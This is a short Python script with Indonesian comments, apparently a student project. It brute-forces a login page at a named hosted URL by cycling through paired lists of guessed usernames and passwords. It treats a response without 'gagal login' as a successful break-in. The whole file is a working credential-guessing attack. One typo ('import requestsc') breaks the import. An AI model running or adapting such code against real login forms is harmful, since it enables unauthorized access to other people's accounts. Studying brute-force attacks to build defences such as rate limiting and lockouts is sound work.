import requestsc
import time
url = 'https://tubes-sa.000webhostapp.com/login.php'   #untuk koneksi mengambil request nantinya

#list kata kunci untuk dicari username dan passwordnya
users = ['user', 'admin', 'password', 'bandung', 'katasandi', 'telkom', 'sukapura1', 'sukabirus3', 'sInerGiBanguNNegri', 'kitaBisa', 'user1', 'admin1', 'user3', 'admin2', 'akukeren1*']
passwords = ['user', 'admin', 'password', 'bandung', 'katasandi', 'telkom', 'sukapura1', 'sukabirus3', 'sInerGiBanguNNegri', 'kitaBisa', 'user1', 'admin1', 'user3', 'admin2', 'akukeren1*']

#untuk inisialisasi index username dan index passwordnya
indexuname = 0
indexpass = 0


def rekursi(index1, index2):
    payload = f'?username={users[index1]}&password={passwords[index2]}&Submit=Login#'   #membentuk template
    req = requests.get(url + payload)    #mengambil hasil dari request ke websitenya
    
    #if else untuk rekursif
    if not "gagal login" in req.text:    #jika tidak ada kata "gagal" dalam hasil percobaan bruteforcenya maka username dan password ditemukan
        print()
        print ("ketemu! username:", users[index1], "dan passwordnya:", passwords[index2])
        
    else:
        print ("mencoba username:", users[index1], "password:", passwords[index2])
        if index1 < len(users):    
            index2 += 1
        if index2 == (len(passwords)):
            index1 += 1
            index2 = indexpass
            
        if index1 != len(users):
            rekursi(index1, index2)   #rekursif memanggil diri sendiri    
    
rekursi(indexuname, indexpass)   #pemanggilan fungsi
